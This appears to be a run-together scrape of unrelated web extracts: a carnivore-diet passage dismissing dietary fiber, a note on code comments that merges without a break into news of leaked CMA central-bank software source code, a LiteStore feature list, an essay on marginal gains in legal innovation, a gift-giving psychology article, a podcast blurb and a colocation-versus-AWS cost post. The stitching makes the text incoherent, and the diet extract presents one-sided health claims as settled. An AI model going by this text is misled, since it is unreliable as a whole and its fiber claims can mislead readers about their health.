sell more of a surplus crop, itself the result of an outdated farm subsidy. In fact, the World Journal of Gastroenterology published a study showing that<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3435786/pdf/WJG-18-4593.pdf"> reducing fiber actually reduces digestive issues</a>.</p><p>And if you're concerned about colon cancer, at least two double-blind, randomized clinical trials have shown that neither a<a href="https://pubmed.ncbi.nlm.nih.gov/10770980/"> dietary supplement of wheat-bran fiber</a> nor a<a href="https://pubmed.ncbi.nlm.nih.gov/12223437/"> high-fiber diet</a> reduced the risk of colorectal adenoma, the precursor to colorectal cancer.</p><p>A fiberless diet seems counterintuitive until you think about babies: for the first 6 months of our lives, humans eat absolutely no fiber yet have no problem filling up diapers.</p><p><strong>On hydration.</strong> While it didn't immediately jump to mind as a concern, a little research revealed that a meat-only diet can mean increased electrolyte loss leading to dehydration. Because a carnivore diet is essentially an extreme form of a Keto diet, my body would be in ketosis and flushing out more salt. This leads to reduced water retention and can result in dehydration. So I planned on drinking two liters of water per day and being generous with salting my meat. I bought a 1-liter Nalgene to easily track my water intake, aiming for two full bottles everyday.</p><p>All that aside…&nbsp;</p><h2>Could meat be good for you?</h2><p>According …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At the start of my career I was really triggered by code comments. Reading <code>Clean Code</code> over and over made comments stand out like a wort in every file.</p>
<p>I’m not gonna talk about comments which should not exist, but only share a point learned through tough lessons in my career.</p>
<p>Comments should explain the why, I can figure out the what from the code (hopefully at a first glance), but in some cases you will never be able to figure out the why just from the code. In the same note as commits, comments should be about the why and not about the what. This are the comments that I would’ve loved to be there.</p>

<p>This week, the source code of CMA, a software provider relied on by leading central banks across nations and stock exchanges has been exposed online.</p>



<p>Recently, threat intelligence analyst <em>Bank_Security </em>tweeted:</p>



<blockquote><p>“The National Central Banks related software has been published on a public repo. The code has been developed by http://cma.se, that creates software primarily for Central Banks and Stock Exchanges. Allegedly over $100bn/day in transactions happen via their software.”</p><cite>via <em>Bank_Security</em></cite></blockquote>

<p>On taking a closer look, <em>Security Report</em> can confirm the source code for what appear to be CMA’s applications, has indeed been leaked online.</p>

<p>The actor behind this leak is the same one who had previously exposed source code from <a rel="noreferrer noopener" href="https://www.bleepingcomputer.com/news/security/source-code-from-dozens-of-companies-leaked-online/" target="_blank">dozens of companies online</a>, which included names like Microsoft, Adobe, Lenovo, AMD, Qualcomm, Motorola, Mediatek, GE Appliances, Nintendo, Roblox, Disney, and so on.</p>



<p>The incident could be worrisome because, unless the banks using CMA’s source code are at the top of their game with strict security controls, vulnerabilities discovered in CMA’s code later could be exploited by adversaries to attack these targets.</p>

December 1, 2020 | https://h3rald.com/litestore/ | <a href="https://web.archive.org/web/*/https://h3rald.com/litestore/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>LiteStore is a lightweight, self-contained, RESTful, multi-format NoSQL document store server written in <a href="http://nim-lang.org/">Nim</a> and powered by a <a href="http://www.sqlite.org/">SQLite</a> backend for storage. It aims to be a very simple and lightweight backend ideal for prototyping and testing REST APIs and client-side, single-page applications and web apps.</p>

<h3>Key Features</h3>

<p>Despite being fairly small and self-contained, LiteStore comes with many useful features that are essential for many use cases.</p>

<h4>Multi-format Documents</h4>

<p>LiteStore can be used to store documents in virtually any format, as long as you specify an appropriate content type for them. Textual documents are stored as-is, while binary documents are base64-encoded (not the best thing in the world, but definitely the easiest and most portal option).</p>

<h4>Document Tagging</h4>

<p>You can add custom tags to documents to easily categorize them and retrieve them. Some system tags are also added automatically to identify the document content type, format and collection.</p>

<h4>Enhanced Querying of JSON documents</h4>

<p>By leveraging the <a href="https://www.sqlite.org/json1.html">SQLite JSON1 extension</a> and implementing custom query string parsing, LiteStore provides enhanced filtering, ordering, and custom field selection of JSON documents. Additionally, you can also configure custom indexes specifying JSON fields for extra speed!</p>

<h4>Full-text Search</h4>

<p>By leveraging <a href="http://www.sqlite.org/fts3.html">SQLite FTS4 extension</a> and implementing an enhanced algorithm for result rankings, LiteStore provides full-text search for all textual documents out-of-the-box.</p>

<h4>RESTful HTTP API</h4>

<p>Every operation can be performed on the data store using a simple but powerful RESTful HTTP API, perfect for client-side, single-page applications.</p>

<h4>JWT-based Authorization</h4>

<p>LiteStore can be configured to validate <a href="https://jwt.io/">JWT</a> tokens and configure access to specific resources based on specific <a href="https://oauth.net/2/scope/">OAuth2 scopes</a>.</p>

<h4>Middleware</h4>

<p>By leveraging the <a href="https://duktape.org/">duktape</a> library, you can create your own middleware functions in JavaScript to perform additional tasks (validation, logging, data aggregation…) before accessing data.</p>

<h4>Multiple Data Stores</h4>

<p>LiteStore can be configured to manage more than one SQLite file through the same process. At run time, it will be possible to access data stored in each store but also add and remove stores.</p>

<h4>Nim API</h4>

<p>If you want, you can use LiteStore as a <a href="https://nim-lang.org/">Nim</a> library and perform data store operations from your own Nim program.</p>

<h4>Command-line API</h4>

<p>Every operation can also be performed from command line, using the <code>litestore execute</code> command.</p>

<h4>Directory Bulk Import/Export</h4>

<p>To make serving a single-page application from LiteStore even easier and faster, you can automatically import (and export) the contents of a directory recursively.</p>

<h4>Directory Mounting and Mirroring</h4>

<p>After importing the contents of a directory into a LiteStore data store, you can mount it on LiteStore and mirror all data store changes to the filesystem. Incidentally, that’s how most of the LiteStore Admin test app was built .</p>

And it’s a shame.  <strong>Marginal gains are about making small incremental improvements to a process (or product, ability or habit etc) which, when added together, make a significant improvement</strong>. But legal innovation often ignores it.  Why? We’ll find out.  We’ll also provide an easy intro to a few mental models that can identify and deliver these gains within your legal organisation, whether law firm or in-house!</p><h2>What are marginal gains?</h2><p>Consistently improving something by 1% isn’t particularly notable, let alone noticeable.  But in the long run it can be <strong>meaningful</strong>.</p><ul><li>If you improve something by 1% each day for one year, you’ll end up <strong>37 times better</strong> by the end of the year.</li></ul><ul><li>Conversely, if you only get 1% worse each day for one year, you’ll <strong>decline down to almost zero </strong>by the end of the year.</li></ul><p>If the principle sounds familiar, you may have heard of similar ideas, e.g. <strong>continuous improvement</strong> or <strong>Kaizen</strong>.  Both continuous improvement and Kaizen have as their goals the ongoing improvement of products or services and the elimination of waste through data-informed iterative analytical improvements.  Many of these improvements will be small, but when added together represent a large improvement.</p><h2>Why care?</h2><h4>It wins gold meals</h4><p>The <strong>marginal gains</strong> theory was popularised by <a href="https://www.britishcycling.org.uk/membership?gclid=Cj0KCQiAqdP9BRDVARIsAGSZ8AnEnL5TB7QykSE4kP3duW3orq_qoJcRdjhaogZQtNDxSuQIwcqV99waAlDMEALw_wcB">British Cycling</a>‘s 2008 and 2012 Olympic cycling team.  Prior to 2008, British Cycling was widely regarded as a “laughing stock”.  In an effort to fix things British Cycling hired performance director <a href="https://en.wikipedia.org/wiki/Dave_Brailsford">David Brailsford</a>.</p><p>Brailsford believed that 1% improvements across all aspects of cycling aggregated into a significant performance gain.</p><p>Under his guidance British Cycling implemented all sorts of tiny improvements:</p><blockquote><p>Using antibacterial hand gel to cut down on infections, rubbing alcohol on bicycle tires for better grip, redesigning bike seats for greater comfort, extensive wind tunnel testing of bikes and racing suits etc.</p></blockquote><p>Within 5 years after Brailsford took over, British Cycling won 57% of all road and track cycling gold medals at the 2008 Beijing Olympics, and at the 2012 London Olympics set 9 Olympic records and 7 world records.</p><p>During the ten-year span 2007 – 2017, British cyclists won 178 world championships and 66 Olympic or Paralympic gold medals and captured 5 Tour de France victories.</p><p>Quite a turnaround.</p><h4><strong>Big returns are the accumulation of small wins</strong></h4><p>Over time, the difference between allowing something to worsen by 1% each day vs. improve by 1% each day becomes extremely significant.  Consider the below:</p><div><figure><img loading="lazy" width="869" height="348" src="https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_Table.png" alt="Marginal Gains Table" srcset="https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_Table.png 869w, https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_Table-300x120.png 300w, https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_Table-768x308.png 768w, https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_Table-585x234.png 585w" sizes="(max-width: 869px) 100vw, 869px" data-src="https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_Table.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div><p>If you start the year with £100 of value and manage to improve that value by 1% each day for 365 days you <strong>37x </strong>that value by year end.  Over time, assuming the same 1% per day incremental improvement, that value balloons to a very large number.</p><p>Conversely, letting that value degrade by 1% each day quickly reduces that value to a very small number.  £100 becomes £2.55 after one year of daily 1% declines! Thereafter it reduces further and further toward, but never reaching zero, although in real (as opposed to mathematical) terms, it hits zero just after 1 year.</p><p>As this graph demonstrates:</p><div><figure><img loading="lazy" src="https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_2.png" alt="Marginal Gains Graph 1% better or 1% worse each day for 365 days" width="962" height="584" srcset="https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_2.png 962w, https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_2-300x182.png 300w, https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_2-768x466.png 768w, https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_2-585x355.png 585w" sizes="(max-width: 962px) 100vw, 962px" data-src="https://lawtomated.com/wp-content/uploads/2020/11/Marginal_Gains_2.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div><p>Which curve would you prefer to be on? The blue or the red?</p><h4><strong>Small is easier to start</strong></h4><p>If you break down a larger goal, problem or process into smaller steps, it is easier for an individual or organisation to measure, critique, brainstorm solutions for and implement winning improvements over time.  As attractive as double digit improvements sound, they are often hard to contextualise and action, let alone start.</p><h4><strong>Competitive edge</strong> hides in the margins</h4><p>As with the British Cycling example, focusing on 1% marginal gains can create a competitive edge.  This is all the more so given how easily and often marginal gains are overlooked.</p><p>Car manufacturing, where similar principles of continuous improvement and Kaizen originate, paint a similar picture.</p><p><a href="https://www.toyota.co.uk/?gclid=Cj0KCQiAqdP9BRDVARIsAGSZ8Ak7bStcKvAgldLvrbdCHVp9lJGnkGmXSqqk2pAByRvNt3YoNhW3ROIaAnAOEALw_wcB&amp;gclsrc=aw.ds">Toyota</a>, pioneer of the <strong><a href="https://www.toyota-europe.com/world-of-toyota/this-is-toyota/the-toyota-way">Toyota Way</a></strong> and derivative principles (e.g. Six Sigma, Lean), used this attention to detail and marginal gains philosophy. In doing so Toyota quickly leapfrogged the US car manufacturing industry in the latter half of the last century, building a lasting reputation as a reliable manufacturer of superior and well priced cars vs. its overpriced and unreliable US counterparts.</p><h2>Why marginal gains are wrongly overlooked</h2><h4>1% returns excite no one</h4><p>Instinctively a 1% improvement to a product or process sounds too small a target. You’re probably aiming higher: 25% or 50%+ gains.</p><blockquote><p>Put it this way: given the choice, would you prefer someone promising a 25% gain today or a 1% improvement each day?</p></blockquote><p>You’d probably choose the 25% gain.  But is that wise?</p><p>As we’ve shown above, ignoring marginal gains is at best, missing out on significant long term gains, and at worst inviting terminal decline.</p><p>Using an admittedly extreme example, if organisation A and B start with the same £100 of value, and A improves by 1% each day whereas B worsens by 1% each day over the course of 365 days, at the end of the year…</p><p>…A’s value is <strong>1,481x </strong>B’s!</p><div><figure><img loading="lazy" width="879" height="163" src="https://lawtomated.com/wp-content/uploads/2020/11/Screenshot-2020-11-18-at-13.25.39.png" alt="Marginal Gains Multiplier" srcset="https://lawtomated.com/wp-content/uploads/2020/11/Screenshot-2020-11-18-at-13.25.39.png 879w, https://lawtomated.com/wp-content/uploads/2020/11/Screenshot-2020-11-18-at-13.25.39-300x56.png 300w, https://lawtomated.com/wp-content/uploads/2020/11/Screenshot-2020-11-18-at-13.25.39-768x142.png 768w, https://lawtomated.com/wp-content/uploads/2020/11/Screenshot-2020-11-18-at-13.25.39-585x108.png 585w" sizes="(max-width: 879px) 100vw, 879px" data-src="https://lawtomated.com/wp-content/uploads/2020/11/Screenshot-2020-11-18-at-13.25.39.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div><p>This is the same reason we don’t all have six pack abs: you have to work at them every day, via diet and exercise, to attain and then maintain them.</p><h4>1% each day requires a long term mindset</h4><p>The difference between being 1% better or worse each day is minimal at first.  But as the above graph and example of organisations A and B demonstrated, these differences accumulate and widen significantly over time.</p><p>Most legal organisations are short-termist, and easily disregard the accumulated benefit of 1% gains over a year.  But doing so is giving away a significant opportunity, or worse, inviting terminal decline if your processes and products trend 1% worse each day and a competitor’s improve 1% per day.</p><h4>Legal (spin)innovation, FOMO and Shiny Objects are easier than 1% each day</h4><p>Legal innovation suffers from three ailments:</p><p>1. <strong>Shiny Object Syndrome (SOS).</strong>  Chasing the latest shiny <strong>#legaltech</strong> simply because it is new and in vogue, or overhyped in the press.</p><p>2. <strong>FOMO.</strong> Buying skills and / or software because of a peer firm’s flashy press release.</p><p>3. <strong>Spinnovation</strong>. Focusing on winning awards and issuing glossy press releases.</p><div><figure><img loading="lazy" width="640" height="472" src="https://lawtomated.com/wp-content/uploads/2020/11/gollumfire.gif" alt="Gollum Smeagol Ring Lord of the Rings" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>Buying a no code 5G quantum AI blockchain when what you needed was a lava pit free workspace.</figcaption></figure></div><p>In each case, this is <a href="https://en.wikipedia.org/wiki/Busy_work">busy work</a>. It has the appearance of innovation and is often quite easy, i.e. buy X, announce X… buy Y, announce Y and so on.</p><p>Now we have some logos for a pitch deck, our website or the next conference or media plug.</p><p>But did it change anything for the better?</p><p>Has the customer benefited? Is anyone in the organisation using these tools or applying these newly trained skills? Did they actually need them? Are they able to use them, and use them well? Does the organisation know what it already has and, if not, why not? Of the things it already has, how many are actually used by the organisation, or used poorly? Would there be a higher ROI if you made everyone expert users of Microsoft Office? (Check out <a href="https://craftycounsel.co.uk/boxset/microsoft-office-hacks-for-lawyers">this</a> excellent boxset of how-to videos re Microsoft Office hacks by <a href="https://craftycounsel.co.uk/">Crafty Counsel</a>) Did you just buy something that overlaps 1:1 with another thing you bought last quarter that no one used?</p><p>Why is this?</p><p>Time spent <strong>asking</strong> these questions and <strong>listening</strong> to the answers is time well spent, and better spent vs. diverting resource to press releases, pitch materials and the never-ending consumption of new.</p><blockquote><p>But what is simple to do is simpler to not do. And that is what usually happens.</p></blockquote><p>All too often the legal market chases change via consumption.</p><p>But like buying a new outfit to make you feel good, albeit temporarily, would it be better to buy a gym membership and do the hard yards of diet and exercise to get in shape and look good in a scruffy t-shirt, or better still, naked?</p><p>But as with most things in life, there are few / no silver bullets, despite what vendors promise.  Some of the biggest improvements are the accumulation of small wins made consistently.</p><p>As someone famous once said, a six-pack wasn’t built in a day (OK we made that up, but you get the picture).</p><p>So too with legal innovation, let alone any innovation!  It can’t be bought, but only built.  Brick by brick.</p><h3>And this is where marginal gains slot in</h3><p>The marginal gains technique approaches improvement like a marathon, not a sprint.</p><p>It’s not about running full throttle in a short burst, or buying the most expensive running trainers.</p><p>Instead, it’s having the patience to critically and continually assess your diet and form in order to improve, whilst maintaining stamina to keep going for the long term.</p><p>Why bother?</p><p>Focussing on marginal gains – and some techniques to help identify them – may uncover that you already have tools or expertise in your organisation that are under-utilised through lack of awareness, training, buy-in or otherwise.</p><p>Righting these issues can deliver gains without having to buy more things and spread fewer resources across yet more things.</p><p>Likewise, the very issues in your organisation that prevented your existing products or processes from being successfully utilised might also be the very same things that – left unchecked – doom to failure anything new, no matter how shiny or prized by your peers in their spinnovative press release!</p><h2>How to identify, measure and improve via marginal gains?</h2><p>In simple terms: <strong>map your process</strong>.  Identify the pain points. Measure them. Analytically and empirically design, implement, measure and test solutions.  Did it improve? Yes, great.  If not, try again.  Once you get it working, build in controls to ensure the improvements are maintained and new ones identifiable.</p><p>Where are small things eating away at your overall process efficiency?</p><p>If you want a more rigorous framework, you might wish to consider a time tested method such as the Six Sigma concept, <strong>DMAIC</strong>.</p><h3>What’s DMAIC?</h3><p>DMAIC stands for: <strong>define, measure, analyse, improve and control</strong>.</p><p>DMAIC is a five-phase data-driven strategy to improve processes.  It is integral to&nbsp;<a href="https://en.wikipedia.org/wiki/Six_Sigma">Six Sigma</a>, but in general, can be implemented as a standalone …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2>I Love It! (I Hate It.)</h2><p>There's a sound of rustling paper. You crack the wrap at the seam. You look inside, unveiling the item within. It's...</p><p>Crap. It’s crap. It’s a crap present that you don’t want.</p><p>You lift your head and, with a beaming grin, you <em>somehow</em> manage to let out a torrent of thanks and praise for what you have just received. This is wonderful! It's just what I wanted! How did you know? I love it! I'll treasure it forever!</p><p>Within a day, it's stuffed in a drawer. Within a week, it's forgotten. Within a month, it's on eBay or off to the charity shop. Worse, it just ends up in a landfill somewhere.</p><p>If you had to guess, how many times would you say this has happened to you when you've received gifts at Christmas or on birthdays?</p><p>Here comes the even worse part: now think about how many times this might have happened with gifts<em> that you have given to others.</em></p><p><strong>Think you've got a perfect record?</strong> Think again, because you really, honestly, probably don't.</p><h2>A Lot of Gifts Aren't Actually That Good</h2><p>In 1993 - to cries of 'Grinch!' - economist Joel Waldfogel published a now-infamous paper (among certain economist circles, anyway) titled '<a href="https://graphics8.nytimes.com/images/blogs/freakonomics/pdf/WaldfogelDeadweightLossXmas.pdf">The Deadweight Loss of Christmas</a>'.</p><p>In it, Waldfogel argues that huge sums of money are wasted every year on gifts that nobody really wants. More accurately, he reported that many gift recipients valued their gifts at a dollar amount much lower than was actually paid for the item.</p><p>For example, if I bought you a gift for $100 and you thought that it was actually worth about $70 it would mean that, somewhere along the line, <em>you’ve destroyed $30</em>. Pop! It's gone. You might as well have just taken your cash and burnt it.</p><p>Waldfogel found that anywhere between 10% and 33% of all Christmas gifts cause this kind of loss every year. This is stunning, especially when we extrapolate out to the entire population.</p><p>He concludes by saying that many people could do worse than simply giving cash as a gift because it would carry more value than the actual gifts they might otherwise have bought.</p><p>Unless you are absolutely convinced that you are god's gift to... well, gift-giving, then you're probably seeing the same loss of value with your own gifts. Or, to put it another way, <strong>a lot of your gifts probably suck whether you realise it or not</strong>.</p><p>You won't see this, though, because nobody is going to turn around and tell you that your gifts were 'only 70% good'. If anything, the reactions that we get with a good gift and a bad gift are remarkably similar. Nobody wants to make you feel like a bastard at Christmas, even if you did hand out some absolute clangers.</p><p>But is it so bad, really, losing a few dollars every year? In short, yes. And then some. But not just because of the money you're wasting.</p><h2>Good Gift Giving Is Incredibly Important</h2><p>Outside of bland analysis by economists that ordinary people haven’t heard of, gift-giving helps us maintain and preserve social ties at all of life’s most important occasions; birthdays, Christmas, Valentine's day, anniversaries, graduations... you name it.</p><p>In between these occasions there is usually some kind of imbalance between the gifts that we have given to one another. That is, you might knock it out of the park one year and I might give you something that’s nowhere near as good. Next time, I'm going to want to do much better. This imbalance leads, in part, to the continuation of the tradition.</p><p>Giving good gifts help to form and strengthen social bonds. It helps us show people how much we care, how much we love them. It helps us say sorry. It helps us convey meaning. It helps us have fun and take delight in generosity. A life without giving and receiving gifts would be a dull life indeed.</p><p>On the other hand, giving bad gifts can degrade the quality of those same bonds. <strong>At best, it can be annoying to be given a bad gift. At worst, it can drive people apart.</strong> If Waldfogel's research is correct, an awful lot of us are unwittingly dropping the ball every year, without really realising it.</p><p>Luckily, it's not just economists giving their miserable analysis of the situation; a handful of psychologists have waded in and they're here to tell you that you're just <em>thinking</em> <em>about it all wrong</em>.</p><h2>Why Our Gifts Don't Work</h2><p>There's a surprising amount of research literature out there that all points in a similar direction as to why gifts don't work and what we can do about it. To find a way through this gift-giving minefield, I've gone through some of the most widely-cited papers to get to the bottom of it all. (Citations can be found at the end of this article.)</p><h3>Gift-Givers and Gift-Receivers Think Differently</h3><p>Gifts don't always hit the spot because the psychology of <em>giving</em> gifts is totally different to the psychology of <em>getting</em> gifts. Although it all happens during the same event, we unwittingly think about these two things in totally different ways.</p><p>When people <em>give</em> gifts, they typically want to nail one or more of these four different things:</p><ul role="list"><li>Surprise (the wow factor)</li><li>Desirability (the clout factor)</li><li>Materiality (the price tag)</li><li>Social responsibility (that is, looking virtuous)</li></ul><p>Gift <em>receivers</em>, though? <strong>Their priorities are completely different</strong>. They want:</p><ul role="list"><li>Usefulness (can I do something with it?)</li><li>Versatility (can I do a variety of things with it?)</li><li>Quality (is it well made/going to last?)</li><li>Stuff they've asked for (did I actually say I want this?)</li></ul><p>Given the difference between these two lists, is it any wonder that some gifts simply don't hit the mark?</p><h3>We Focus too Much on The Moment of Exchange</h3><p>When we give gifts we are mostly thinking about 'the moment' in which we hand it over, seeing the reaction of our recipients. We narcissistically want the chorus of 'oohs' and 'aahs' that come with nailing a really good gift that somebody loves. Whether or not those reactions last any longer than the moment of exchange, though, is not something that gift givers really care about.</p><p>Research shows that we make greater errors with gift giving when those gifts are being opened in public - perhaps at a party - than when we give them in private - such as wedding presents.</p><p>This is because<strong> we end up optimising for the maximum showboat potential of the gifts we give</strong> because it feels good to do so well in public. Once the event is over, though, we basically forget about it all. Onto the next thing.</p><p>Not so for the gift recipient. After the party is over and everyone's gone home... they've still got the gift. It matters much more to them what comes <em>after</em> the moment of exchange.</p><p>This means that it's better to buy a gift that has greater long term appeal than just the momentary 'wow' factor, even if it doesn't feel as good to us in the moment.</p><h3>We Like to Be Given Experiences... But We Don't Like to Gift Them</h3><p>Research shows that an 'experience' gift - like a night out at the theatre or a wine tasting course - is often preferred instead of the usual variety of material gifts that get doled out every year.&nbsp;</p><p>The only problem is that gift-givers don't really like to give experiences as gifts because the moment of exchange is relatively dull. This is usually because there's some stand-in that gets handed over - a voucher or a certificate - and the response is likely to be bland at best.</p><p>The <em>real</em> excitement comes much later when they cash that voucher in. But, of course, the gift-giver can’t actually be there to see that happen. No good.</p><h3>We Care too Much About the Price</h3><p>Gift-givers tend to believe that the more generous or pricey a gift is, the better it must be. This rarely works. For recipients, the absolute quality of the gift matters much more. This is equally true for something that the giver thinks is really thoughtful, too.</p><p>This happens when we put an enormous amount of thought and money into a gift for a friend or relative, <strong>only to find that they have no interest in it.&nbsp;</strong></p><p>A good example of this might be picking up on someone's love for music and then buying them a beautiful acoustic guitar. There's little guarantee that they have any interest in playing an instrument at all, no matter how expensive it is or how much thought you put into it.</p><p>If they're not regularly playing that thing a year later, you’ve probably goofed.</p><h3>We're Too Distant</h3><p>If you're genuinely quite distant from the gift recipient, it's almost impossible to get a good gift for them that they will genuinely want. This means one of two things:</p><ol role="list"><li>You probably shouldn't bother, or</li><li>You can give them cash (or a cash equivalent)</li></ol><p>Whether or not you <em>should</em> give them cash is another question. If they're your grandchildren this is absolutely fine. If they're your grandparents, perhaps not.</p><p>In the latter instance, a good 'consumable' like a decent bottle of wine or a box of chocolates will do. But don't worry about it much more than that.</p><h3>Be Careful With Charity Gifts</h3><p>Sadly, recipients are less grateful about virtuous charitable gifts than we would hope for. While they're good for the cause, they don't score well against the ways in which we normally value gifts. They make the gift giver look good and they feel good in the moment, but they are not valued as much. </p><p>Of course, if someone tells you that they would value a charitable gift then go for it. But don't assume that anybody will actually like it as a gift unless you have discussed it in advance.</p><h2>How to Buy Gifts People Actually Want</h2><p>All hope is not lost. You <em>shall</em> buy gifts that people will actually want! Here's how.</p><h3>Be Realistic About Your Relationship With The Recipient</h3><p>In Waldfogel's 1993 study, there's a chart of gift effectiveness that more or less screams at aunts, uncles and grandparents to simply not bother with material gifts and to give cash instead:</p><figure id="w-node-9f5a4418121f-c39ae183"><p><img src="https://uploads-ssl.webflow.com/5e8b192239b9b4843e9ae18f/5fbfe9af234e056f30021f18_GTfsGCvFwKV3s1qidXi6Ls7EIYGoOQBVRr8o_3XvvwZ6IHt4QwNvAaje0p8Il8hWv-Yz1jcRU9A98nTmQMijJOrXU6E6gZC5FSi4_f_WOLuJY2XXZtR2CCIEYZsyAMvYo1P60Hr3.jpeg" alt=""></p></figure><p>Are you soulmates, together as a couple for many years? You obviously stand a much higher chance of getting the recipient something they will actually want.</p><p>If you’re anyone else, you will have a harder time and should maybe not worry so much about making sure your gift is as ‘thoughtful’ as possible and just focus on making their gift useful or buying them an experience.</p><h3>...Ask Them What They Want</h3><p>It seems obvious, …</p></div></div></div>

<p>Cookies are getting aggressively expired or blocked outright. Referring site information is getting stripped. Adoption of Brave as a browser is on the rise! Yet, marketers still need to quantify the impact of their investments. What is an analyst to do? Does the answer lie in server-side technical solutions? Well, it’s not a bad idea to consider that. But, it’s almost certainly not “the answer” to the multi-touch attribution question(s). Arguably, a better solution was one proposed by Jan Baptist van Helmont in 1648: randomized controlled trials. On this episode, data scientist <a href="https://www.linkedin.com/in/jlsutherland/">Dr. Joe Sutherland</a> returns to the show to talk about the ins and outs of problem formulation, experimental design, the cost of data, and, ultimately, causal inference. This is one of those rare shows where there actually IS a solution to a problem that vexes analysts and their stakeholders. The trick is really just getting the industry to understand and apply the approach!</p>

            <!-- content --><p>Years ago, we had a big decision to make. In 2013, STH had grown to a size that would seem immeasurably small by the traffic we do today. Still, at that point, we made the decision that it made fiscal sense to leave Amazon AWS for colocation. We chronicled the reasoning in <a href="https://www.servethehome.com/falling-sky-sth-leaving-cloud-amazon-aws/">Falling From the Sky Why STH is Leaving the Cloud</a> and then the cost breakdown in&nbsp;<a href="https://www.servethehome.com/falling-sky-part-3-evaluating-amazon-ec2-vps-dedicated-colocation-options/">Falling From the Sky Part 3 – Evaluating Amazon EC2, VPS, Dedicated and Colocation Options</a>. Since 2013, we have been doing some irregular updates that largely correspond to planned upgrades of our infrastructure. Since we are taking a look at a few upgrades again, it is time to go through the exercise again.<span id="more-48850"></span></p>

<p>If you want to hear this instead of just reading, we have a YouTube video with some commentary here:</p>
<p><iframe title="Our Colocation Hosting versus AWS Costs Compared 2020 Edition" width="696" height="392" src="https://www.youtube.com/embed/RqetN_i0BnE?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Of course, we can go into a bit more detail below, but some prefer to listen rather than read so we have that option.</p>

<p>In 2018, we looked again at whether it was time to move back to the cloud. In our cost analysis, this is what we found using 1-year estimates:</p>
<figure id="attachment_26722" aria-describedby="caption-attachment-26722"><a href="https://www.servethehome.com/falling-from-the-sky-part-4-leaving-the-cloud-5-years-later/sth-2018-web-hosting-budget-v-aws/" rel="attachment wp-att-26722"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2018/03/STH-2018-Web-Hosting-Budget-v-AWS.jpg" alt="STH 2018 Web Hosting Budget V AWS" width="536" height="156" srcset="https://www.servethehome.com/wp-content/uploads/2018/03/STH-2018-Web-Hosting-Budget-v-AWS.jpg 536w, https://www.servethehome.com/wp-content/uploads/2018/03/STH-2018-Web-Hosting-Budget-v-AWS-400x116.jpg 400w, https://www.servethehome.com/wp-content/uploads/2018/03/STH-2018-Web-Hosting-Budget-v-AWS-533x156.jpg 533w, https://www.servethehome.com/wp-content/uploads/2018/03/STH-2018-Web-Hosting-Budget-v-AWS-534x156.jpg 534w" sizes="(max-width: 536px) 100vw, 536px"></a><figcaption id="caption-attachment-26722">STH 2018 Web Hosting Budget V AWS</figcaption></figure>
<p>Just to give some sense of how that March 2018 estimate has gone in the 32 months since we looked at this, we ended up using:</p>
<ul>
<li>Way more bandwidth. STH has grown a ton since 2018. We also focus more on reviews which tend to use more photos. Even with lazy loading images, our bandwidth usage is significantly higher. This did not incur an incremental cost based on how we buy bandwidth. See: <a href="https://www.servethehome.com/buyers-guide-hosting-bandwidth-data-transfer-billing/">Buyer’s Guide to Hosting: Bandwidth, Data Transfer and Billing</a></li>
<li>Several of our VMs doubled memory requirements and we added slightly more storage. We overprovisioned so this was absorbed with still enough leftover.</li>
<li>We replaced a <a href="https://www.servethehome.com/9-step-calm-and-easy-proxmox-ve-boot-drive-failure-recovery/">SSD</a>, upgraded a firewall, and added another <a href="https://www.servethehome.com/explaining-the-automatic-transfer-switching-ats-pdu/">ATS PDU</a>. We have not done long-term infrastructure upgrades.</li>
<li>We ended up using an upgraded node that we had available, as a “hot spare”. We tend to “self-warranty” hardware, and so we had an extra system/ chassis there.</li>
<li>We are going to say we used four hours of labor. This includes drive time to the primary data center. Since it is far away (18-20 minute drive), we actually did not go there for several quarters. So over 32 months, we had budgeted $640 for remote hands. We effectively either paid $160/ hr or paid less than that even rounding up to four hours.</li>
</ul>
<p>Overall, it looks like we probably over-estimated self-hosting costs again, and underestimated AWS costs with respect to how much we would spend there, even after service discounts.</p>
<h2>The Late 2020 AWS v. Colocation Update</h2>
<p>We wanted to answer the question of what the picture would look like for hosting STH now. A few quick words before we get there on assumptions.</p>
<p>First off, we completely could change the way we run the site. That is a given. Frankly, running in VMs whether on the cloud or in self-hosting is convenient. Indeed, we run containers in VMs as well. We could also overhaul the entire software stack again, but frankly, we want to spend more time creating content then doing that work. Something that we learned was that we had less reliability by increasing complexity than by keeping things as simple as possible.</p>
<p>Second, we are modeling current data transfer, and a minimal set of VMs. We actually have a lot more running, including some services that we run for some of the labs. One could argue that since they are lab services they are part of bringing you STH, but they are not focused on the web hosting aspect so we are going to remove them. Also, we have other VMs that are likely only online because we wanted to try something and had capacity. We may or may not elect to run the VMs if there was the AWS incremental cost. We could model these as on-demand or spot instances, but instead, we are just removing them entirely.</p>
<p>Third, we completely understand spot pricing. We are modeling a basic set instead of adding extras. At some point, we need databases, nginx servers, and so forth.</p>
